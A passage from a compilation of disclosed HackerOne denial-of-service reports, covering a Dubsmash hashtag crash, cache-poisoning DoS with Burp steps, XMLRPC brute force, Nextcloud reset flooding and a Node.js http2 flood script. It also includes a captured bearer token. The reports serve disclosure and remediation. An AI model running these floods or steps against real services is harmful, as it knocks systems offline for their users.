{"query":"query TagUGC($name: String!, $page: String, $ranking: ContentRankingMethod) {\n  tag(name: $name) {\n    __typename\n    num_objects\n    objects(object_type: VIDEO, page_size: 9, offset: $page, ranking: $ranking) {\n      __typename\n      results {\n        __typename\n        ... on Video {\n          ...VideoFragment\n        }\n      }\n      next\n    }\n  }\n}\nfragment VideoFragment on Video {\n  __typename\n  uuid\n  created_at\n  creator {\n    __typename\n    ...PublicUserFragment\n  }\n  video_type\n  item_type\n  video_data {\n    __typename\n    mobile {\n      __typename\n      video\n      thumbnail\n    }\n    animated_thumbnail {\n      __typename\n      video\n      thumbnail\n    }\n  }\n  updated_at\n  status\n  liked\n  caption: title\n  original_sound: sound {\n    __typename\n    ...SoundFragment\n  }\n  num_views\n  num_likes\n  num_comments\n  comments_allowed\n  share_link\n  width\n  height\n  duet_allowed\n  privacy_level\n  is_featured\n  is_live\n  community {\n    __typename\n    ...CommunityFragment\n  }\n  duet_with {\n    __typename\n    uuid\n    title\n    creator {\n      __typename\n      uuid\n      username\n    }\n  }\n  top_comments {\n    __typename\n    ...BasicCommentFragment\n  }\n  prompt {\n    __typename\n    ...PromptFragment\n  }\n  poll {\n    __typename\n    ...PollFragment\n  }\n  mentions {\n    __typename\n    ...MentionFragment\n  }\n  shoutout {\n    __typename\n    ...BasicShoutoutFragment\n  }\n}\nfragment PublicUserFragment on User {\n  __typename\n  username\n  uuid\n  display_name\n  blocked\n  followed\n  num_public_post_plays\n  followsCount: num_follows\n  followingsCount: num_followings\n  share_link\n  date_joined\n  has_invite_badge\n  badges\n  profile_picture\n  allow_video_download\n  bio\n  ... on User {\n    gifts_offered: products_offered(product_type: GIFT) {\n      __typename\n      results {\n        __typename\n        product {\n          __typename\n          uuid\n        }\n      }\n    }\n    shoutouts_offered: products_offered(product_type: SHOUTOUT) {\n      __typename\n      results {\n        __typename\n        product {\n          __typename\n          uuid\n        }\n      }\n    }\n  }\n}\nfragment SoundFragment on Sound {\n  __typename\n  uuid\n  created_at\n  sound\n  name\n  waveform_raw_data\n  liked\n  soundStatus: status\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n  share_link\n  num_likes\n  num_videos\n}\nfragment ContentCreatorFragment on User {\n  __typename\n  username\n  uuid\n  date_joined\n  followed\n  has_invite_badge\n  badges\n  profile_picture\n}\nfragment CommunityFragment on Community {\n  __typename\n  uuid\n  created_at\n  updated_at\n  name\n  description\n  member_count\n  online_members\n  post_count\n  is_subscribed\n  icon\n  banner_image\n}\nfragment BasicCommentFragment on Comment {\n  __typename\n  uuid\n  text\n  likesCount: num_likes\n  created_at\n  liked\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n}\nfragment PromptFragment on Prompt {\n  __typename\n  uuid\n  created_at\n  name\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n  liked\n}\nfragment PollFragment on Poll {\n  __typename\n  uuid\n  title\n  num_total_votes\n  choices {\n    __typename\n    ...PollChoiceFragment\n  }\n  positioning {\n    __typename\n    ...StickerPositioningFragment\n  }\n  voted_for {\n    __typename\n    ...PollChoiceFragment\n  }\n}\nfragment PollChoiceFragment on PollChoice {\n  __typename\n  uuid\n  name\n  num_votes\n  index\n}\nfragment StickerPositioningFragment on StickerPositioning {\n  __typename\n  x\n  y\n  width\n  height\n  rotation\n}\nfragment MentionFragment on Mention {\n  __typename\n  object {\n    __typename\n    ... on User {\n      ...PublicUserFragment\n    }\n    ... on Tag {\n      ...TagFragment\n    }\n  }\n  content_type\n  positioning {\n    __typename\n    ...StickerPositioningFragment\n  }\n  interval {\n    __typename\n    start_time\n    end_time\n  }\n}\nfragment TagFragment on Tag {\n  __typename\n  uuid\n  name\n  num_objects\n  num_plays\n  subscribed\n  top_videos {\n    __typename\n    ...TopVideoFragment\n  }\n}\nfragment TopVideoFragment on Video {\n  __typename\n  uuid\n  video_data {\n    __typename\n    mobile {\n      __typename\n      thumbnail\n    }\n  }\n  creator {\n    __typename\n    uuid\n    username\n  }\n}\nfragment BasicShoutoutFragment on Shoutout {\n  __typename\n  uuid\n  created_at\n  updated_at\n  requestor {\n    __typename\n    ...PublicUserFragment\n  }\n  status\n  creator {\n    __typename\n    ...PublicUserFragment\n  }\n}","variables":{"page":null,"ranking":"POPULARITY_HASHTAGS","name":"hexagonalprism"}}
```

User profile API:
```
POST /graphql?build_number=52430&platform=ios HTTP/2
Host: gateway-production.dubsmash.com
Content-Type: application/json
X-Device-Country: IN
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkX2F0IjoxLjYyMzk1NDg2NGUrMDksImV4cCI6MTYyNDA0MTI2NCwiaGFzX3B1YmxpY19wcm9maWxlIjp0cnVlLCJwZXJtaXNzaW9uX2dyb3VwcyI6W10sInJlcXVlc3RfaWQiOiJkYjNhNWIxZi01ZWNlLTQ5YTctYWQwOS1kYjEyYmZlMTQ5ODUiLCJ1c2VybmFtZSI6IjMwNTIzZmEwYzE3MzQ3MDNiNzM4N2E1NjliZTA2MmNkIn0.aWVynW42kALTw18Z6IAfVuUFJmUS7lGW_1F7I2SjJUXsrH2HHsnw3R-gKSiTnW-U5kc11BZnGO3nqoAZwtqPJA
X-Dubsmash-Device-Id: 8F15E960-B1C5-4C30-A100-CA0527827502
X-Accept-Content-Language: en_IN
Accept-Language: en-IN;q=1.0, hi-IN;q=0.9
Accept-Encoding: gzip, deflate
If-None-Match: W/"52-sxSZbTm01+no7htgkLGYqCFOwFk"
X-Device-Language: en
X-Build-Number: 52430
X-Device-Timezone: 19800
X-App-Version: 6.3.0
X-Remote-Config-Values: []
User-Agent: Dopesmash/6.3.0 (com.mobilemotion.dubsmash; build:52430; iOS 14.0.1) Alamofire/5.4.1
Content-Length: 4707
Connection: close

{"variables":{"next":null,"username":"test123458","itemType":"POST","pageSize":9},"query":"query UserUGC($username: String!, $itemType: VideoItemType!, $next: String, $pageSize: Int!) {\n  user(username: $username) {\n    __typename\n    videos(next: $next, page_size: $pageSize, item_type: $itemType) {\n      __typename\n      results {\n        __typename\n        ...VideoFragment\n      }\n      next: next_page\n    }\n  }\n}\nfragment VideoFragment on Video {\n  __typename\n  uuid\n  created_at\n  creator {\n    __typename\n    ...PublicUserFragment\n  }\n  video_type\n  item_type\n  video_data {\n    __typename\n    mobile {\n      __typename\n      video\n      thumbnail\n    }\n    animated_thumbnail {\n      __typename\n      video\n      thumbnail\n    }\n  }\n  updated_at\n  status\n  liked\n  caption: title\n  original_sound: sound {\n    __typename\n    ...SoundFragment\n  }\n  num_views\n  num_likes\n  num_comments\n  comments_allowed\n  share_link\n  width\n  height\n  duet_allowed\n  privacy_level\n  is_featured\n  is_live\n  community {\n    __typename\n    ...CommunityFragment\n  }\n  duet_with {\n    __typename\n    uuid\n    title\n    creator {\n      __typename\n      uuid\n      username\n    }\n  }\n  top_comments {\n    __typename\n    ...BasicCommentFragment\n  }\n  prompt {\n    __typename\n    ...PromptFragment\n  }\n  poll {\n    __typename\n    ...PollFragment\n  }\n  mentions {\n    __typename\n    ...MentionFragment\n  }\n  shoutout {\n    __typename\n    ...BasicShoutoutFragment\n  }\n}\nfragment PublicUserFragment on User {\n  __typename\n  username\n  uuid\n  display_name\n  blocked\n  followed\n  num_public_post_plays\n  followsCount: num_follows\n  followingsCount: num_followings\n  share_link\n  date_joined\n  has_invite_badge\n  badges\n  profile_picture\n  allow_video_download\n  bio\n  ... on User {\n    gifts_offered: products_offered(product_type: GIFT) {\n      __typename\n      results {\n        __typename\n        product {\n          __typename\n          uuid\n        }\n      }\n    }\n    shoutouts_offered: products_offered(product_type: SHOUTOUT) {\n      __typename\n      results {\n        __typename\n        product {\n          __typename\n          uuid\n        }\n      }\n    }\n  }\n}\nfragment SoundFragment on Sound {\n  __typename\n  uuid\n  created_at\n  sound\n  name\n  waveform_raw_data\n  liked\n  soundStatus: status\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n  share_link\n  num_likes\n  num_videos\n}\nfragment ContentCreatorFragment on User {\n  __typename\n  username\n  uuid\n  date_joined\n  followed\n  has_invite_badge\n  badges\n  profile_picture\n}\nfragment CommunityFragment on Community {\n  __typename\n  uuid\n  created_at\n  updated_at\n  name\n  description\n  member_count\n  online_members\n  post_count\n  is_subscribed\n  icon\n  banner_image\n}\nfragment BasicCommentFragment on Comment {\n  __typename\n  uuid\n  text\n  likesCount: num_likes\n  created_at\n  liked\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n}\nfragment PromptFragment on Prompt {\n  __typename\n  uuid\n  created_at\n  name\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n  liked\n}\nfragment PollFragment on Poll {\n  __typename\n  uuid\n  title\n  num_total_votes\n  choices {\n    __typename\n    ...PollChoiceFragment\n  }\n  positioning {\n    __typename\n    ...StickerPositioningFragment\n  }\n  voted_for {\n    __typename\n    ...PollChoiceFragment\n  }\n}\nfragment PollChoiceFragment on PollChoice {\n  __typename\n  uuid\n  name\n  num_votes\n  index\n}\nfragment StickerPositioningFragment on StickerPositioning {\n  __typename\n  x\n  y\n  width\n  height\n  rotation\n}\nfragment MentionFragment on Mention {\n  __typename\n  object {\n    __typename\n    ... on User {\n      ...PublicUserFragment\n    }\n    ... on Tag {\n      ...TagFragment\n    }\n  }\n  content_type\n  positioning {\n    __typename\n    ...StickerPositioningFragment\n  }\n  interval {\n    __typename\n    start_time\n    end_time\n  }\n}\nfragment TagFragment on Tag {\n  __typename\n  uuid\n  name\n  num_objects\n  num_plays\n  subscribed\n  top_videos {\n    __typename\n    ...TopVideoFragment\n  }\n}\nfragment TopVideoFragment on Video {\n  __typename\n  uuid\n  video_data {\n    __typename\n    mobile {\n      __typename\n      thumbnail\n    }\n  }\n  creator {\n    __typename\n    uuid\n    username\n  }\n}\nfragment BasicShoutoutFragment on Shoutout {\n  __typename\n  uuid\n  created_at\n  updated_at\n  requestor {\n    __typename\n    ...PublicUserFragment\n  }\n  status\n  creator {\n    __typename\n    ...PublicUserFragment\n  }\n}"}
```

Community API:
```
POST /graphql?build_number=52430&platform=ios HTTP/2
Host: gateway-production.dubsmash.com
Content-Type: application/json
X-Device-Country: IN
Accept: application/json
Authorization: Bearer xxxxxxx
X-Dubsmash-Device-Id: 8F15E960-B1C5-4C30-A100-CA0527827502
X-Accept-Content-Language: en_IN
Accept-Language: en-IN;q=1.0, hi-IN;q=0.9
Accept-Encoding: gzip, deflate
If-None-Match: W/"1c03-0+FK7TwWGvh/rKyVJ5n+lHkl05o"
X-Device-Language: en
X-Build-Number: 52430
X-Device-Timezone: 19800
X-App-Version: 6.3.0
X-Remote-Config-Values: []
User-Agent: Dopesmash/6.3.0 (com.mobilemotion.dubsmash; build:52430; iOS 14.0.1) Alamofire/5.4.1
Content-Length: 4682
Connection: close

{"variables":{"uuid":"db89458d693b49fdbdced90f3b5e2f90","next":null},"query":"query CommunityPosts($uuid: String!, $next: String) {\n  community(uuid: $uuid) {\n    __typename\n    ... on Community {\n      posts(next: $next) {\n        __typename\n        next\n        results {\n          __typename\n          ... on Video {\n            ...VideoFragment\n          }\n        }\n      }\n    }\n  }\n}\nfragment VideoFragment on Video {\n  __typename\n  uuid\n  created_at\n  creator {\n    __typename\n    ...PublicUserFragment\n  }\n  video_type\n  item_type\n  video_data {\n    __typename\n    mobile {\n      __typename\n      video\n      thumbnail\n    }\n    animated_thumbnail {\n      __typename\n      video\n      thumbnail\n    }\n  }\n  updated_at\n  status\n  liked\n  caption: title\n  original_sound: sound {\n    __typename\n    ...SoundFragment\n  }\n  num_views\n  num_likes\n  num_comments\n  comments_allowed\n  share_link\n  width\n  height\n  duet_allowed\n  privacy_level\n  is_featured\n  is_live\n  community {\n    __typename\n    ...CommunityFragment\n  }\n  duet_with {\n    __typename\n    uuid\n    title\n    creator {\n      __typename\n      uuid\n      username\n    }\n  }\n  top_comments {\n    __typename\n    ...BasicCommentFragment\n  }\n  prompt {\n    __typename\n    ...PromptFragment\n  }\n  poll {\n    __typename\n    ...PollFragment\n  }\n  mentions {\n    __typename\n    ...MentionFragment\n  }\n  shoutout {\n    __typename\n    ...BasicShoutoutFragment\n  }\n}\nfragment PublicUserFragment on User {\n  __typename\n  username\n  uuid\n  display_name\n  blocked\n  followed\n  num_public_post_plays\n  followsCount: num_follows\n  followingsCount: num_followings\n  share_link\n  date_joined\n  has_invite_badge\n  badges\n  profile_picture\n  allow_video_download\n  bio\n  ... on User {\n    gifts_offered: products_offered(product_type: GIFT) {\n      __typename\n      results {\n        __typename\n        product {\n          __typename\n          uuid\n        }\n      }\n    }\n    shoutouts_offered: products_offered(product_type: SHOUTOUT) {\n      __typename\n      results {\n        __typename\n        product {\n          __typename\n          uuid\n        }\n      }\n    }\n  }\n}\nfragment SoundFragment on Sound {\n  __typename\n  uuid\n  created_at\n  sound\n  name\n  waveform_raw_data\n  liked\n  soundStatus: status\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n  share_link\n  num_likes\n  num_videos\n}\nfragment ContentCreatorFragment on User {\n  __typename\n  username\n  uuid\n  date_joined\n  followed\n  has_invite_badge\n  badges\n  profile_picture\n}\nfragment CommunityFragment on Community {\n  __typename\n  uuid\n  created_at\n  updated_at\n  name\n  description\n  member_count\n  online_members\n  post_count\n  is_subscribed\n  icon\n  banner_image\n}\nfragment BasicCommentFragment on Comment {\n  __typename\n  uuid\n  text\n  likesCount: num_likes\n  created_at\n  liked\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n}\nfragment PromptFragment on Prompt {\n  __typename\n  uuid\n  created_at\n  name\n  creator {\n    __typename\n    ...ContentCreatorFragment\n  }\n  liked\n}\nfragment PollFragment on Poll {\n  __typename\n  uuid\n  title\n  num_total_votes\n  choices {\n    __typename\n    ...PollChoiceFragment\n  }\n  positioning {\n    __typename\n    ...StickerPositioningFragment\n  }\n  voted_for {\n    __typename\n    ...PollChoiceFragment\n  }\n}\nfragment PollChoiceFragment on PollChoice {\n  __typename\n  uuid\n  name\n  num_votes\n  index\n}\nfragment StickerPositioningFragment on StickerPositioning {\n  __typename\n  x\n  y\n  width\n  height\n  rotation\n}\nfragment MentionFragment on Mention {\n  __typename\n  object {\n    __typename\n    ... on User {\n      ...PublicUserFragment\n    }\n    ... on Tag {\n      ...TagFragment\n    }\n  }\n  content_type\n  positioning {\n    __typename\n    ...StickerPositioningFragment\n  }\n  interval {\n    __typename\n    start_time\n    end_time\n  }\n}\nfragment TagFragment on Tag {\n  __typename\n  uuid\n  name\n  num_objects\n  num_plays\n  subscribed\n  top_videos {\n    __typename\n    ...TopVideoFragment\n  }\n}\nfragment TopVideoFragment on Video {\n  __typename\n  uuid\n  video_data {\n    __typename\n    mobile {\n      __typename\n      thumbnail\n    }\n  }\n  creator {\n    __typename\n    uuid\n    username\n  }\n}\nfragment BasicShoutoutFragment on Shoutout {\n  __typename\n  uuid\n  created_at\n  updated_at\n  requestor {\n    __typename\n    ...PublicUserFragment\n  }\n  status\n  creator {\n    __typename\n    ...PublicUserFragment\n  }\n}"}
```

Exploit:
1. Serach for the #hexagonalprism in the hashtag search option. 
2. You'll observe 3/4 video's thumbnails in the hashtag search.
3. Click on the hashtag to view all videos, the hashtag API will throw "Internal Server Error" and will not display any video.

## Impact

The impact of this vulnerability is severe if the attackers use all trending hashtags in the description and upload the video then the other users will not be able to load the trending hashtags and view the videos. 

Also, if the video is uploaded in the community then all other videos will not appear in that particular community tab as the community API stops responding properly.

---

### [Cache Posioning leading to denial of service at `█████████` - Bypass fix from report #1198434	](https://hackerone.com/reports/1322732)

- **Report ID:** `1322732`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** U.S. Dept Of Defense
- **Reporter:** @brumens
- **Bounty:** - usd
- **Disclosed:** 2021-10-13T22:15:38.530Z
- **CVE(s):** -

**Vulnerability Information:**

#Vulnerability Cache Posioning (CPDoS)
**C**ache **P**osioning **D**enial **O**f **S**ervice (CPDoS) [1] is taking advantage of 301 redirects by storing an false value of either domain, port or header that effect the response in any way. This makes the cache server store the false value and later delivery it to all users that view the domain page.
This vulnerability is in fact an Cache poisoning [2] in the ground which makes it possible to not harm the system in any way when testing. This is because it's possible to add random URL path to the domain that make only that path exploited under x time.
An attacker will use intruder to update the cache server every x sec, min or hours to make the domain down.

#Summary
The vulnerability was discovered when  was retesting the vulnerability and discovered that the domain still was vulnerable for cache poisoning. I did some tests and I was able to re poisoning the domains cache server again in different paths. It looks like the fix from report *#1198434* only fixed one path in the domain but other paths remain vulnerable.

# Proof of concept
*Can be used as step by step if you like*

█████████

Supported link
[1] https://cpdos.org/ - "What is CPDoS?", Vulnerability explained
[2] https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning - "Responsible denial of service with web cache poisoning", James Kettle

Best regards,
Brumens

## Impact

An attacker is able to crash most of the paths related to the domain.

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
**WARNING!** Do not send the request until the step to send the request comes. Otherwise you can by mistage crash the whole domain.
1. Open an browser that is connected to Burp suite
2. Visit: https://██████████/██████████ (*More path are vulnerable but this is an example*)
3. Intercept the request with Burp suite and add it to the repeater.
**IMPORTEN** Add an random parameter at the end as example: &CPDoS=1 in the url bar at *Repeater*. (*See image at step 4.*)
4. Add an nonexcisting port at the host header domain. Ex: 1234 Your request raw data should look like below:
█████ 
If an random paramter is added at the end AND the port is added to the host header. You can now send the request in Burp suite repeater tab. The data will look similary to:

5. You will see an 301 that do redirect and reflect the port you gave inside the request.
In the request raw data. Delete the port number inside the host header.
Send the request now one more time. You will see the port you added before is still reflecting in the 301 redirect code. This indicates that it's now cache poisoned and the domain path is down. Try visit the url and you can see you won't be able to load it.

## Suggested Mitigation/Remediation Actions
Configure the cache server on all paths and locations on the domain.

---

### [Cache Posioning leading do Denial of Service on `www.█████████`](https://hackerone.com/reports/1198434)

- **Report ID:** `1198434`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** U.S. Dept Of Defense
- **Reporter:** @brumens
- **Bounty:** - usd
- **Disclosed:** 2021-07-09T18:20:57.220Z
- **CVE(s):** -

**Vulnerability Information:**

*Hey!
To be clear. This was not an test for Denial of service (DOS). I accidentally come a cross this vulnerability when I was testing for Server side request forgery (SSRF). I have read you policy well and I was not preforming any type of activity that harmed or slowed you system in anyway. You can read why below when I explain the cache poisoning vulnerability that is the core of the impact.*

# Vulnerability Cache Posioning (CPDoS)

**C**ache **P**osioning **D**enial **O**f  **S**ervice (CPDoS) [1] is taking advantage of *301* redirects by storing an false value of either domain, port or header that effect the response in any way. This makes the cache server store the false value and later delivery it to all users that view the domain page.

This vulnerability is in fact an Cache poisoning [2] in the ground which makes it possible to not harm the system in any way when testing. This is because it's possible to add random URL path to the domain that make only that path exploited under *x* time.

An attacker will use intruder to update the cache server every x sec, min or hours to make the domain down. 

# Summary

The vulnerability was discovered when I was testing for SSRF in the host header field.  I notice that it was behaving weard so I added an random parameter in the URL field of the domain that made it redirect with code *301*. This ended up in an reflection of the URL bar in the response.

When the URL of the redirect was reflected I was able to add an random port number and store it into the cache server.

#Proof Of Concept
███

**Supported link**
[1] https://cpdos.org/ - "What is CPDoS?", *Vulnerability explained*
[2]  https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning - "Responsible denial of service with web cache poisoning", *James Kettle*

Best regards,
Alex

## Impact

An attacker is able to Cache posioning the host header. This makes the cache server to store an incorrect port number from the server response and deliver out that incorrect domain and port combined to all users that try access the domain. This make the domain crash and unable to view for users.

**Attackers view**
*For an real attacker to take use of this he/she will disable the random paramter at the url and send it to the home direcly. This will make the domain crash fully*

## System Host(s)
www.███

## Affected Product(s) and Version(s)
/███████

## CVE Numbers


## Steps to Reproduce
**WARNING!** Do not send the request until the step to send the request comes. Otherwise you can by mistage crash the whole domain.

1. Open an browser that is connected to Burp suite
2. Visit: *https://www.███/█████?█████████*
3. Intercept the request with Burp suite and add it to the repeater.
4. **IMPORTEN** Add an random parameter at the end as example: *&CPDoS=1* in the url bar. (*See video POC*).
4. Add an nonexcisting port at the host header domain. Ex: *1234* Your request raw data should look like below:
{F1302641}
5. If an random paramter is added at the end *AND* the port is added to the host header. You can now send the request in Burp suite repeater tab.
The data will look similary to:
```
GET /████████?███████CPDoS=1 HTTP/1.1
Host: www.██████:1234
```
6. You will see an 301 that do redirect and reflect the port you gave inside the request.
7. In the request raw data. Delete the port number inside the host header.
8. Send the request now one more time. You will see the port you added before is still reflecting in the 301 redirect code.
This indicates that it's now cache poisoned and the domain path is down. Image: * FullRequest.png*
████████ <- Might not render...

## Suggested Mitigation/Remediation Actions
Configure the cache server to not store the host header.

---

### [XMLRPC, Enabling XPSA and Bruteforce and DOS + A file disclosing installer-logs.](https://hackerone.com/reports/865875)

- **Report ID:** `865875`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** MTN Group
- **Reporter:** @tandav
- **Bounty:** - usd
- **Disclosed:** 2021-06-14T08:02:16.423Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
[XMLRPC+Installer_logs+Backup_Filename+Admin_username+disclosure]

## Steps To Reproduce:

  1. I was able to successfully exploit XMLRPC with the traditional method, the brute-force was done the username was there in the Installer Logs
  2. path to XMLRPC is http://13.92.255.102/xmlrpc.php + the username is in https://lonestarcell.com/installer-log.txt 
  3. Pingback ping can be used to dos the target server when mishandled
## Supporting Material/References:
I was able to reproduce this whole https://www.netsparker.com/blog/web-security/xml-rpc-protocol-ip-disclosure-attacks/

## Impact

1)Automated once from multiple hosts and be used to cause a mass DDOS attack on the victim.
2) This method is also used for brute force attacks to stealing the admin credentials and other important credentials
3) File disclosure is causing most harm as internal criticals are popping out

---

### [DoS due to improper input validation can break the admin access into the user data will disallow him from editing that user's data.](https://hackerone.com/reports/1147611)

- **Report ID:** `1147611`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Nextcloud
- **Reporter:** @demonia
- **Bounty:** - usd
- **Disclosed:** 2021-06-01T18:29:11.167Z
- **CVE(s):** CVE-2021-32657

**Summary (team):**

# Impact

A malicious user may be able to break the user administration page. This would disallow administrators to administrate users on the Nextcloud instance.

# Patches

It is recommended that the Nextcloud Server is upgraded to 19.0.11, 20.0.10 or 21.0.2

# Workarounds

Use the OCC command line tool to administrate the Nextcloud users.

# References

- [Security Advisory](https://github.com/nextcloud/security-advisories/security/advisories/GHSA-fx62-q47f-f665)

---

### [HTTP2 'unknownProtocol' cause Denial of Service by resource exhaustion](https://hackerone.com/reports/1043360)

- **Report ID:** `1043360`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js
- **Reporter:** @omicronenergy
- **Bounty:** - usd
- **Disclosed:** 2021-03-15T08:25:43.492Z
- **CVE(s):** CVE-2021-22883

**Vulnerability Information:**

**Summary:** 
Node.js http2 server is vulnerable against denial of service attacks when too many connection attempts with an 'unknownProtocol' are established. This leads to a leak of file descriptors. If a file descriptor limit is configured on the system, then the server is unable to accept new connections and prevent the process also from opening, e.g. a file. If no file descriptor limit is configured, then this lead to an excessive memory usage and cause the system to run out of memory.

**Description:**
If an attacker can establish an arbitrary amount of connections to the server and achieves that no session is instantiated by sending data causing the `unknownProtocol` event, then the socket is immediately closed by returning an error message.

If the attacker closes the socket before this can happen or simply do not respond to the response, the node process starts leaking file descriptors and the memory consumption increases dramatically. Node will wait for the response to the `unknownProtocol` message, which will never come.

To solve this issue we registered to the `unknownProtocol` event and had to implement two things:

1. Call `socket.end()` without returning data, which seems to solve the problem partially. The amount of leaked file descriptors decreased dramatically but it is still leaking.
2. Starting a timer and force a `socket.destroy()` after the timeout.

Our current workaround for the problem looks like this:

```
server.on('unknownProtocol', socket => {
  // Install a timeout of 10 second if the socket was
  // not successfully closed, then destroy the socket
  // to ensure that the underlying resources are released.
  const timer = setTimeout(() => {
    if (!socket.destroyed) {
      socket.destroy();
    }
  }, 10000);
  // Un-reference the timer to avoid blocking
  // of application shutdown and clear the timeout
  // if the socket was successfully closed.
  timer.unref();

  // ATTENTION: Do not use the cb from the end call,
  // because this also causes leaks!
  socket.once('close', () => clearTimeout(timer));

  // Try to gracefully close the socket
  // ATTENTION: The default implementation provides an error
  // message to the client, but if the client does not respond
  // this causes the graceful close to fail. Therefore the
  // socket is closed here without any message.
  socket.end();
});
```

Once the node process reached the file descriptor limit of the system it is not possible to establish any new connection to the server. Next the process cannot not do any other operations that require a new file descriptor (e.g. opening a file). If the system has no file descriptor limit, then the process will continue consuming memory until the system has none left.

## Steps To Reproduce:

The following steps assume you are on a linux system. Everything will run on your host system. The IP in the client is hard-coded to `127.0.0.1` and the port is `50000`. The scripts are kept as simple as possible. 

1. Create a file `client.sh` with the content provided in the Supporting Material section below (don't start it now)
2. Create the Javascript file (see Supporting Material section below) and run the example server (may you want to customize the port). You can also start a non-secure server using `createServer()` if you don't have an example key or cert around.
3. You query the file descriptors with the command provided in the Supporting Material section below. Simply replace `{PID}` with the process id of your node server.
4. Maybe you also want to watch the memory consumption with the tool you prefer.
5. Now you are ready to start the client script.

We initially found this issue by running the Greenbone Vulnerability Manager on our server port with the **OvenVAS default** scanner, the **Fast and ultimate** configuration with all kind of vulnerability tests enabled and the **TCP-SYN Service Ping** alive check.

The affected code that causes this issue seems to be [here](https://github.com/nodejs/node/blob/c0ac692ba786f235f9a4938f52eede751a6a73c9/lib/internal/http2/core.js#L2918-L2929).

We are running on Linux x86 with kernel v4.19.148 with node v12.19.0.

## Impact:
Any code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.

This attack has very low complexity and can easily trigger a DOS on an unprotected server.

The above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.

## Supporting Material/References:

client.sh
```
#!/bin/bash

request="GET / HTTP/1.1 Host: Anything"

while true;
do
    echo $request | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &
done
```

Javascript File
```
const http2 = require("http2");
const fs = require("fs");

const port = 50000;

process.on('uncaughtException', error => {
  console.log('An uncaught exception occurred:', error)
});

process.on('unhandledRejection', reason => {
  console.log('An unhandled rejection occurred:', reason)
});

process.on('warning', warning => {
  console.log('A process warning occurred:', warning)
});

function onRequest(req, res) {
  console.log('got request')
}

const serverOptions = {
  key: fs.readFileSync(__dirname + "/key.crt"),
  cert: fs.readFileSync(__dirname + "/cert.crt")
};

http2
  .createSecureServer(serverOptions, onRequest)
  .listen(port, () => {
    console.log("http2 server started on port", port);
  })
  .on('error', (err) => console.log(err))
```
Query file descriptors command
```
ls -l /proc/{PID}/fd | wc -l && ls -l /proc/{PID}/map_files | wc -l
```


If you need anything else let us know.

## Impact

Any code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.

This attack has very low complexity and can easily trigger a DOS on an unprotected server.

The above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.

---

### [Camera adoption DoS - UniFi Protect](https://hackerone.com/reports/1008579)

- **Report ID:** `1008579`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Ubiquiti Inc.
- **Reporter:** @rchase
- **Bounty:** - usd
- **Disclosed:** 2021-02-12T21:34:56.485Z
- **CVE(s):** CVE-2021-22882

**Summary (team):**

A vulnerability was found in UniFi Protect v1.13.7 and earlier that would allow an attacker to use spoofed cameras to perform a denial-of-service attack that could cause the UniFi Protect controller to crash. This vulnerability is fixed in UniFi Protect v1.17.1 and later versions.

Affected Products:
All UniFi Protect host devices
Mitigation:
Update the UniFi Protect controller to v1.17.1 or a later version.

---

### [xmlrpc.php FILE IS enabled it will used for Bruteforce attack and Denial of Service(DoS)](https://hackerone.com/reports/1086850)

- **Report ID:** `1086850`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @harsithsivanandham
- **Bounty:** 500 usd
- **Disclosed:** 2021-02-12T14:50:03.106Z
- **CVE(s):** -

**Summary (team):**

xmlrpc.php file is visible

---

### [Denial of Service by requesting to reset a password](https://hackerone.com/reports/812754)

- **Report ID:** `812754`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Nextcloud
- **Reporter:** @makerlab
- **Bounty:** - usd
- **Disclosed:** 2021-01-25T20:12:19.503Z
- **CVE(s):** CVE-2020-8295

**Vulnerability Information:**

## Description:
I believe that this is posible due to the brute force protection that makes all request last for 30 seconds which in this case is using all the PHP workers avalible in the pool, so the only way to defend yourself is setting up a limit or having a lot of resources.

### How to reproduce:
* In the Nextcloud login screen click the "Forgot password?" button and then type something in the textbox (can be anything)
* Then open the developers tools and go to the network tab
* Hold the "enter" key after pressing the reset password button and in the network tab you will see a lot of request being made
* With just 1000 request I managed to make the demo server "https://demo2.nextcloud.com/" not respond for 1 hour

## Impact

The attacker could make an entire nextcloud installation or even the entire server where it is hosted not respond for a very long time
Also, this attack can be made by almost anyone

---

### [Mission completed. Grinch Networks is down and Christmas saved.](https://hackerone.com/reports/1067090)

- **Report ID:** `1067090`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** h1-ctf
- **Reporter:** @yso
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T18:02:35.193Z
- **CVE(s):** -

**Vulnerability Information:**

Hi, I decided to create a good writeup, but for that I'd need some time, that's why I am submitting this pre-report now, and the actual report I ll submit before the deadline in this thread, right under this one.

Here is some proof that Grinch Networks is down:
